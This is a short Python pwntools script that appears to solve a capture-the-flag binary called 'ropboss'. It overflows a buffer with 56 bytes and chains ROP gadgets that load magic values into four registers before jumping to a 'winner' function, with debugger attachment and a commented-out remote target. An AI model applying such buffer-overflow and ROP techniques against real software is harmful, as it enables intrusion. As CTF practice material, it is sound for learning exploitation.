from pwn import *

p = process("./ropboss")
gdb.attach(p,'''init-gef\n
        b*0x00000000004013b0
        ''')
# p = remote("3.101.12.127" ,5003)
p.recvline()
payload1 = b'yes'
pop_rdi_ret = 0x0000000000401423
pop_rsi_r15_ret = 0x0000000000401421
mov_rdx_nop_pop_rbp = 0x0000000000401267
mov_rcx_nop_pop_rbp = 0x00000000004012d4
winner = 0x000000000040126d
ret = 0x000000000040101a

payload2 = b'a'*56 + p64(pop_rdi_ret) + p64(0xdeadbeef)+ p64(pop_rsi_r15_ret) + p64(0xcafebabe) + p64(0x2)+ p64(mov_rdx_nop_pop_rbp) + p64(0xbabecafe) + p64(0x3) + p64(mov_rcx_nop_pop_rbp) + p64(0xd00df00d) +p64(0x4) + p64(winner)
p.sendline(payload1)
p.sendline(payload2)
p.interactive()
